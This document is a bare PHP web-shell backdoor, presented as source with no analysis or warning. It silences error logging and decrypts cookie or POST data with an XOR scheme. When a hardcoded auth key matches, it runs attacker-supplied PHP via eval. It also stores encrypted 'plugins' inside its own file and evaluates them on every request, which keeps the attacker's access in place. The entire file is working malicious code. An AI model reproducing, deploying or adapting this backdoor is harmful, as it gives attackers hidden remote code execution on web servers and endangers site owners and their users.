<?php
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);


if(!defined("PHP_EOL"))
{
	define("PHP_EOL", "\n");
}

if(!defined("DIRECTORY_SEPARATOR"))
{
	define("DIRECTORY_SEPARATOR", "/");
}

if (!defined('ALREADY_RUN_144c87cf623ba82aafi68riab16atio18'))
{
	define('ALREADY_RUN_144c87cf623ba82aafi68riab16atio18', 1);

	$data = NULL;
	$data_key = NULL;

	$GLOBALS['cs_auth'] = '8debdf89-dfb8-4968-8667-04713f279109';
	global $cs_auth;


	if (!function_exists('file_put_contents'))
	{
		function file_put_contents($n, $d, $flag = False)
		{
			$mode = $flag == 8 ? 'a' : 'w';
			$f = @fopen($n, $mode);
			if ($f === False)
			{
				return 0;
			}
			else
			{
				if (is_array($d)) $d = implode($d);
				$bytes_written = fwrite($f, $d);
				fclose($f);
				return $bytes_written;
			}
		}
	}

	if (!function_exists('file_get_contents'))
	{
		function file_get_contents($filename)
		{
			$fhandle = fopen($filename, "r");
			$fcontents = fread($fhandle, filesize($filename));
			fclose($fhandle);

			return $fcontents;
		}
	}
	function cs_get_current_filepath()
	{
		return trim(preg_replace("/\(.*\$/", '', __FILE__));
	}

	function cs_decrypt_phase($data, $key)
	{
		$out_data = "";

		for ($i=0; $i<strlen($data);)
		{
			for ($j=0; $j<strlen($key) && $i<strlen($data); $j++, $i++)
			{
				$out_data .= chr(ord($data[$i]) ^ ord($key[$j]));
			}
		}

		return $out_data;
	}

	function cs_decrypt($data, $key)
	{
		global $cs_auth;

		return cs_decrypt_phase(cs_decrypt_phase($data, $key), $cs_auth);
	}
	function cs_encrypt($data, $key)
	{
		global $cs_auth;

		return cs_decrypt_phase(cs_decrypt_phase($data, $cs_auth), $key);
	}

	function cs_get_plugin_config()
	{
		$self_content = @file_get_contents(cs_get_current_filepath());

		$config_pos = strpos($self_content, md5(cs_get_current_filepath()));
		if ($config_pos !== FALSE)
		{
			$config = substr($self_content, $config_pos + 32);
			$plugins = @unserialize(cs_decrypt(base64_decode($config), md5(cs_get_current_filepath())));
		}
		else
		{
			$plugins = Array();
		}

		return $plugins;
	}

	function cs_set_plugin_config($plugins)
	{
		$config_enc = base64_encode(cs_encrypt(@serialize($plugins), md5(cs_get_current_filepath())));
		$self_content = @file_get_contents(cs_get_current_filepath());

		$config_pos = strpos($self_content, md5(cs_get_current_filepath()));
		if ($config_pos !== FALSE)
		{
			$config_old = substr($self_content, $config_pos + 32);
			$self_content = str_replace($config_old, $config_enc, $self_content);

		}
		else
		{
			$self_content = $self_content . "\n\n//" . md5(cs_get_current_filepath()) . $config_enc;
		}

		@file_put_contents(cs_get_current_filepath(), $self_content);
	}

	function cs_plugin_add($name, $base64_data)
	{
		$plugins = cs_get_plugin_config();

		$plugins[$name] = base64_decode($base64_data);

		cs_set_plugin_config($plugins);
	}

	function cs_plugin_rem($name)
	{
		$plugins = cs_get_plugin_config();

		unset($plugins[$name]);

		cs_set_plugin_config($plugins);
	}

	function cs_plugin_load($name=NULL)
	{
		foreach (cs_get_plugin_config() as $pname=>$pcontent)
		{
			if ($name)
			{
				if (strcmp($name, $pname) == 0)
				{
					eval($pcontent);
					break;
				}
			}
			else
			{
				eval($pcontent);
			}
		}
	}

	foreach ($_COOKIE as $key=>$value)
	{
		$data = $value;
		$data_key = $key;
	}

	if (!$data)
	{
		foreach ($_POST as $key=>$value)
		{
			$data = $value;
			$data_key = $key;
		}
	}

	$data = @unserialize(cs_decrypt(base64_decode($data), $data_key));

	if (isset($data['ak']) && $cs_auth==$data['ak'])
	{
		if ($data['a'] == 'i')
		{
			$i = Array(
				'pv' => @phpversion(),
				'sv' => '2.0-1',
				'ak' => $data['ak'],
			);
			echo @serialize($i);
			exit;
		}
		elseif ($data['a'] == 'e')
		{
			eval($data['d']);
		}
		elseif ($data['a'] == 'plugin')
		{
			if($data['sa'] == 'add')
			{
				cs_plugin_add($data['p'], $data['d']);
			}
			elseif($data['sa'] == 'rem')
			{
				cs_plugin_rem($data['p']);
			}
		}
		echo $data['ak'];

	}

	cs_plugin_load();
}